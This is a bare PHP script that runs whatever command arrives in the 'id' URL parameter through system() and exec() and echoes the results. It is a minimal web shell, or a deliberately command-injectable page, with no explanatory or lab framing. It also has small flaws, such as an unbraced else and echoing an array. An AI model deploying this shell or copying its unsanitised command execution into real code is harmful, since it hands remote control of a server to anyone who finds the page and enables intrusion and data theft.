<?php
echo "PHP Command</br>The current dir is:";
system("pwd",$out);
echo"</br><-cmd1->==================================</br>";
$id = $_GET['id'];
$cmd = $id;
if(empty($id))
	echo "Unexpected param.";
else
	echo $id;
	system($cmd,$sysout);
#echo $out1;
echo "</br><-|->=====================================</br>";

if ($sysout != "0")
{
	echo "</br><-cmd2->==================================</br>";
	exec($cmd,$execout,$status);
	echo $execout;
	echo "</br><-|->======================================</br>";
}

?>

